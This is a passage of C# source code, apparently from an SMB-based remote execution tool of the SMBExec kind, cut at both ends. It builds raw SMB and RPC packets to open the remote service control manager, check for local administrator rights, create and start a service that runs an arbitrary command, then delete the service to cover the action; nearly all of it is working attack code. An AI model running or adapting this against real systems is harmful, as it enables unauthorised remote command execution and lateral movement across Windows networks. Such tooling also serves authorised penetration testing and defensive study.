                                        OrderedDictionary packet_SMB_data = SMBExec.SMBNTCreateAndXRequest(SMB_named_pipe_bytes);
                                        byte[] SMB_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                        OrderedDictionary packet_NetBIOS_Session_service = SMBExec.NetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                                        byte[] NetBIOS_Session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_Session_service);

                                        if (SMB_signing)
                                        {
                                            MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                            byte[] SMB_Sign = session_key.Concat(SMB_header).Concat(SMB_data).ToArray();
                                            byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            byte[] SMB_Signature2 = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_Signature2;
                                            SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        }
                                        SMB_client_send = NetBIOS_Session_service.Concat(SMB_header).Concat(SMB_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                        SMBClientStage = "RPCBind";

                                    }
                                    break;
                                case "RPCBind":
                                    {
                                        SMB_FID = Utilities.GetByteRange(SMBClientReceive, 42, 43);
                                        packet_SMB_header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                        if (SMB_signing)
                                        {
                                            packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_signing_counter += 2;
                                            byte[] SMB_signing_sequence = BitConverter.GetBytes(SMB_signing_counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                        }
                                        byte[] SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        OrderedDictionary packet_RPC_data = SMBExec.RPCBind(1, new byte[] { 0xb8, 0x10 }, new byte[] { 0x01 }, new byte[] { 0x00, 0x00 }, SMB_named_pipe_UUID, new byte[] { 0x02, 0x00 });
                                        byte[] RPC_data = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                        OrderedDictionary packet_SMB_data = SMBExec.SMBWriteAndXRequest(SMB_FID, RPC_data.Length);
                                        byte[] SMB_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                        int RPC_data_length = SMB_data.Length + RPC_data.Length;
                                        OrderedDictionary packet_NetBIOS_session_service = SMBExec.NetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                        byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                        if (SMB_signing)
                                        {
                                            MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                            byte[] SMB_Sign = session_key.Concat(SMB_header).Concat(SMB_data).Concat(RPC_data).ToArray();

                                            byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        }

                                        SMB_client_send = NetBIOS_session_service.Concat(SMB_header).Concat(SMB_data).Concat(RPC_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                        SMBClientStage = "ReadAndXRequest";
                                        SMB_client_stage_next = "OpenSCManagerW";
                                    }
                                    break;
                                case "ReadAndXRequest":
                                    {
                                        Thread.Sleep(sleep * 1000);
                                        packet_SMB_header = SMBExec.SMBHeader(new byte[] { 0x2e }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                        if (SMB_signing)
                                        {
                                            packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_signing_counter += 2;
                                            byte[] SMB_signing_sequence = BitConverter.GetBytes(SMB_signing_counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                        }
                                        byte[] SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        OrderedDictionary packet_SMB_data = SMBExec.SMBReadAndXRequest(SMB_FID);
                                        byte[] SMB_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                        OrderedDictionary packet_NetBIOS_session_service = SMBExec.NetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                                        byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);

                                        if (SMB_signing)
                                        {
                                            MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                            byte[] SMB_Sign = session_key.Concat(SMB_header).Concat(SMB_data).ToArray();
                                            byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            byte[] SMB_Signature2 = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_Signature2;
                                            SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        }
                                        SMB_client_send = NetBIOS_session_service.Concat(SMB_header).Concat(SMB_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                        SMBClientStage = SMB_client_stage_next;
                                    }
                                    break;

                                case "OpenSCManagerW":
                                    {
                                        packet_SMB_header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                        if (SMB_signing)
                                        {
                                            packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_signing_counter += 2;
                                            byte[] SMB_signing_sequence = BitConverter.GetBytes(SMB_signing_counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                        }

                                        OrderedDictionary packet_SCM_data = SMBExec.SCMOpenSCManagerW(SMB_service_bytes, SMB_service_length);
                                        SCM_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                        OrderedDictionary packet_RPC_data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0f, 0x00 }, null);
                                        byte[] RPC_data = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                        byte[] SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        OrderedDictionary packet_SMB_Data = SMBExec.SMBWriteAndXRequest(SMB_FID, (RPC_data.Length + SCM_data.Length));
                                        byte[] SMB_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_Data);
                                        int RPC_data_length = SMB_data.Length + SCM_data.Length + RPC_data.Length;
                                        OrderedDictionary packet_NetBIOS_Session_Service = SMBExec.NetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                        byte[] NetBIOS_Session_Service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_Session_Service);
                                        if (SMB_signing)
                                        {
                                            MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                            byte[] SMB_Sign = session_key.Concat(SMB_header).Concat(SMB_data).Concat(RPC_data).Concat(SCM_data).ToArray();
                                            byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        }
                                        SMB_client_send = NetBIOS_Session_Service.Concat(SMB_header).Concat(SMB_data).Concat(RPC_data).Concat(SCM_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                        SMBClientStage = "ReadAndXRequest";
                                        SMB_client_stage_next = "CheckAccess";
                                    }
                                    break;
                                case "CheckAccess":
                                    {
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 108, 111)) == "00-00-00-00" && BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 88, 107)) != "00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00")
                                        {
                                            SMB_service_manager_context_handle = Utilities.GetByteRange(SMBClientReceive, 88, 107);
                                            if (SMB_execute)
                                            {
                                                OrderedDictionary packet_SCM_data = SMBExec.SCMCreateServiceW(SMB_service_manager_context_handle, SMB_service_bytes, SMB_service_length, SMBExec_command, SMBExec_command_length_bytes);
                                                SCM_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                                if (SCM_data.Length < SMB_split_index)
                                                {
                                                    SMBClientStage = "CreateServiceW";
                                                }
                                                else
                                                {
                                                    SMBClientStage = "CreateServiceW_First";
                                                }
                                            }
                                            else
                                            {
                                                output.AppendLine(String.Format("{0} is a local administrator on {1}", output_username, target));
                                                SMB_close_service_handle_stage = 2;
                                                SMBClientStage = "CloseServiceHandle";
                                            }

                                        }
                                        else if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 108, 111)) == "05-00-00-00")
                                        {
                                            output.AppendLine(String.Format("{0} is not a local administrator or does not have the required privileges on {1}", output_username, target));
                                            return output.ToString();
                                        }
                                        else
                                        {
                                            if (debug)
                                            {
                                                output.AppendLine(BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 108, 111)));
                                                output.AppendLine(BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 88, 107)));
                                            }
                                            output.AppendLine(String.Format("Something went wrong with {0}", target));
                                            return output.ToString();
                                        }

                                    }

                                    break;

                                case "CreateServiceW":
                                    {
                                        packet_SMB_header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                        if (SMB_signing)
                                        {
                                            packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_signing_counter += 2;
                                            byte[] SMB_signing_sequence = BitConverter.GetBytes(SMB_signing_counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                        }

                                        OrderedDictionary packet_SCM_data = SMBExec.SCMCreateServiceW(SMB_service_manager_context_handle, SMB_service_bytes, SMB_service_length, SMBExec_command, SMBExec_command_length_bytes);
                                        SCM_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                        OrderedDictionary packet_RPC_data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, null);
                                        byte[] RPC_data = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                        byte[] SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        OrderedDictionary packet_SMB_data = SMBExec.SMBWriteAndXRequest(SMB_FID, RPC_data.Length + SCM_data.Length);
                                        byte[] SMB_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                        int RPC_data_length = SMB_data.Length + SCM_data.Length + RPC_data.Length;
                                        OrderedDictionary packet_NetBIOS_session_service = SMBExec.NetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                        byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                        if (SMB_signing)
                                        {
                                            MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                            byte[] SMB_Sign = session_key.Concat(SMB_header).Concat(SMB_data).Concat(RPC_data).Concat(SCM_data).ToArray();

                                            byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        }
                                        SMB_client_send = NetBIOS_session_service.Concat(SMB_header).Concat(SMB_data).Concat(RPC_data).Concat(SCM_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                        SMBClientStage = "ReadAndXRequest";
                                        SMB_client_stage_next = "StartServiceW";
                                    }
                                    break;
                                case "CreateServiceW_First":
                                    {
                                        SMB_split_stage_final = Math.Ceiling((double)SCM_data.Length / SMB_split_index);
                                        packet_SMB_header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                        if (SMB_signing)
                                        {
                                            packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_signing_counter += 2;
                                            byte[] SMB_signing_sequence = BitConverter.GetBytes(SMB_signing_counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                        }
                                        byte[] SCM_data_first = Utilities.GetByteRange(SCM_data, 0, SMB_split_index - 1);
                                        OrderedDictionary packet_RPC_data = SMBExec.RPCRequest(new byte[] { 0x01 }, 0, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_data_first);
                                        packet_RPC_data["RPCRequest_AllocHint"] = BitConverter.GetBytes(SCM_data.Length);
                                        SMB_split_index_tracker = SMB_split_index;
                                        byte[] RPC_data = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                        byte[] SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        OrderedDictionary packet_SMB_data = SMBExec.SMBWriteAndXRequest(SMB_FID, RPC_data.Length);
                                        byte[] SMB_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                        int RPC_data_length = SMB_data.Length + RPC_data.Length;
                                        OrderedDictionary packet_NetBIOS_session_service = SMBExec.NetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                        byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                        if (SMB_signing)
                                        {
                                            MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                            byte[] SMB_Sign = session_key.Concat(SMB_header).Concat(SMB_data).Concat(RPC_data).ToArray();
                                            byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        }
                                        SMB_client_send = NetBIOS_session_service.Concat(SMB_header).Concat(SMB_data).Concat(RPC_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                        if (SMB_split_stage_final <= 2)
                                        {
                                            SMBClientStage = "CreateServiceW_Last";
                                        }
                                        else
                                        {
                                            SMB_split_stage = 2;
                                            SMBClientStage = "CreateServiceW_Middle";
                                        }
                                    }
                                    break;
                                case "CreateServiceW_Middle":
                                    {
                                        SMB_split_stage++;
                                        packet_SMB_header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                        if (SMB_signing)
                                        {
                                            packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_signing_counter += 2;
                                            byte[] SMB_signing_sequence = BitConverter.GetBytes(SMB_signing_counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                        }
                                        byte[] SCM_data_middle = Utilities.GetByteRange(SCM_data, SMB_split_index_tracker, SMB_split_index_tracker + SMB_split_index - 1);
                                        SMB_split_index_tracker += SMB_split_index;
                                        OrderedDictionary packet_RPC_data = SMBExec.RPCRequest(new byte[] { 0x00 }, 0, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_data_middle);
                                        packet_RPC_data["RPCRequest_AllocHint"] = BitConverter.GetBytes(SCM_data.Length - SMB_split_index_tracker + SMB_split_index);
                                        byte[] RPC_data = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                        byte[] SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        OrderedDictionary packet_SMB_data = SMBExec.SMBWriteAndXRequest(SMB_FID, RPC_data.Length);
                                        byte[] SMB_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                        int RPC_data_length = SMB_data.Length + RPC_data.Length;
                                        OrderedDictionary packet_NetBIOS_session_service = SMBExec.NetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                        byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                        if (SMB_signing)
                                        {
                                            MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                            byte[] SMB_Sign = session_key.Concat(SMB_header).Concat(SMB_data).Concat(RPC_data).ToArray();
                                            byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        }
                                        SMB_client_send = NetBIOS_session_service.Concat(SMB_header).Concat(SMB_data).Concat(RPC_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                        if (SMB_split_stage >= SMB_split_stage_final)
                                        {
                                            SMBClientStage = "CreateServiceW_Last";
                                        }
                                        else
                                        {
                                            SMBClientStage = "CreateServiceW_Middle";
                                        }

                                    }
                                    break;

                                case "CreateServiceW_Last":
                                    {
                                        packet_SMB_header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x48 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                        if (SMB_signing)
                                        {
                                            packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_signing_counter += 2;
                                            byte[] SMB_signing_sequence = BitConverter.GetBytes(SMB_signing_counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                        }
                                        byte[] SCM_data_last = Utilities.GetByteRange(SCM_data, SMB_split_index_tracker, SCM_data.Length);
                                        SMB_split_index_tracker += SMB_split_index;
                                        OrderedDictionary packet_RPC_data = SMBExec.RPCRequest(new byte[] { 0x02 }, 0, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_data_last);
                                        byte[] RPC_data = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                        byte[] SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        OrderedDictionary packet_SMB_data = SMBExec.SMBWriteAndXRequest(SMB_FID, RPC_data.Length);
                                        byte[] SMB_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                        int RPC_data_length = SMB_data.Length + RPC_data.Length;
                                        OrderedDictionary packet_NetBIOS_session_service = SMBExec.NetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                        byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                        if (SMB_signing)
                                        {
                                            MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                            byte[] SMB_Sign = session_key.Concat(SMB_header).Concat(SMB_data).Concat(RPC_data).ToArray();
                                            byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        }
                                        SMB_client_send = NetBIOS_session_service.Concat(SMB_header).Concat(SMB_data).Concat(RPC_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                        SMBClientStage = "ReadAndXRequest";
                                        SMB_client_stage_next = "StartServiceW";
                                    }
                                    break;

                                case "StartServiceW":
                                    {
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 112, 115)) == "00-00-00-00")
                                        {
                                            SMB_service_context_handle = Utilities.GetByteRange(SMBClientReceive, 92, 111);
                                            packet_SMB_header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = BitConverter.GetBytes(SMB_signing_counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }
                                            OrderedDictionary packet_SCM_data = SMBExec.SCMStartServiceW(SMB_service_context_handle);
                                            SCM_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                            OrderedDictionary packet_RPC_data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x03, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x13, 0x00 }, null);
                                            byte[] RPC_data = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            byte[] SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_data = SMBExec.SMBWriteAndXRequest(SMB_FID, RPC_data.Length + SCM_data.Length);
                                            byte[] SMB_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            int RPC_data_length = SMB_data.Length + SCM_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_NetBIOS_session_service = SMBExec.NetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = session_key.Concat(SMB_header).Concat(SMB_data).Concat(RPC_data).Concat(SCM_data).ToArray();

                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = NetBIOS_session_service.Concat(SMB_header).Concat(SMB_data).Concat(RPC_data).Concat(SCM_data).ToArray();
                                            SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                            SMBClientStage = "ReadAndXRequest";
                                            SMB_client_stage_next = "DeleteServiceW";
                                        }
                                        else if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 112, 115)) == "31-04-00-00")
                                        {
                                            output.AppendLine(String.Format("Service {0} creation failed on {1}", SMB_service, target));
                                            return output.ToString();
                                        }
                                        else
                                        {
                                            output.AppendLine("Service Creation Fault Context Mismatch");
                                            return output.ToString();
                                        }
                                    }
                                    break;
                                case "DeleteServiceW":
                                    {
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 88, 91)) == "1D-04-00-00")
                                        {
                                            if (debug) { output.AppendLine(String.Format("Command Executed with ServiceName: {0} on {1}", SMB_service, target)); }
                                        }
                                        else if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 88, 91)) == "02-00-00-00")
                                        {
                                            SMBExec_failed = true;
                                            if (debug) { output.AppendLine(String.Format("Service {0} failed to start on {1}", SMB_service, target)); }
                                        }
                                        packet_SMB_header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);

                                        if (SMB_signing)
                                        {
                                            packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_signing_counter += 2;
                                            byte[] SMB_signing_sequence = BitConverter.GetBytes(SMB_signing_counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                        }

                                        OrderedDictionary packet_SCM_data = SMBExec.SCMDeleteServiceW(SMB_service_context_handle);
                                        SCM_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                        OrderedDictionary packet_RPC_data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x04, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x02, 0x00 }, null);
                                        byte[] RPC_data = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                        byte[] SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        OrderedDictionary packet_SMB_data = SMBExec.SMBWriteAndXRequest(SMB_FID, RPC_data.Length + SCM_data.Length);
                                        byte[] SMB_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                        int RPC_data_length = SMB_data.Length + SCM_data.Length + RPC_data.Length;
                                        OrderedDictionary packet_NetBIOS_session_service = SMBExec.NetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                        byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                        if (SMB_signing)
                                        {
                                            MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                            byte[] SMB_Sign = session_key.Concat(SMB_header).Concat(SMB_data).Concat(RPC_data).Concat(SCM_data).ToArray();
                                            byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        }
                                        SMB_client_send = NetBIOS_session_service.Concat(SMB_header).Concat(SMB_data).Concat(RPC_data).Concat(SCM_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                        SMBClientStage = "ReadAndXRequest";
                                        SMB_client_stage_next = "CloseServiceHandle";
                                        SMB_close_service_handle_stage = 1;
                                    }
                                    break;
                                case "CloseServiceHandle":
                                    {
                                        OrderedDictionary packet_SCM_data = new OrderedDictionary();
                                        if (SMB_close_service_handle_stage == 1)
                                        {
                                            if (debug) { output.AppendLine(String.Format("Service {0} deleted on {1}", SMB_service, target)); }
                                            service_deleted = true;
                                            SMB_close_service_handle_stage++;
                                            packet_SCM_data = SMBExec.SCMCloseServiceHandle(SMB_service_context_handle);
                                        }
                                        else
                                        {
                                            SMBClientStage = "CloseRequest";
                                            packet_SCM_data = SMBExec.SCMCloseServiceHandle(SMB_service_manager_context_handle);
                                        }
                                        packet_SMB_header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);

                                        if (SMB_signing)
                                        {
                                            packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_signing_counter += 2;
                                            byte[] SMB_signing_sequence = BitConverter.GetBytes(SMB_signing_counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                        }
                                        SCM_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                        OrderedDictionary packet_RPC_data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x05, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, null);
                                        byte[] RPC_data = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                        byte[] SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        OrderedDictionary packet_SMB_data = SMBExec.SMBWriteAndXRequest(SMB_FID, RPC_data.Length + SCM_data.Length);
                                        byte[] SMB_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                        int RPC_data_length = SMB_data.Length + SCM_data.Length + RPC_data.Length;
                                        OrderedDictionary packet_NetBIOS_session_service = SMBExec.NetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                        byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                        if (SMB_signing)
                                        {
                                            MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
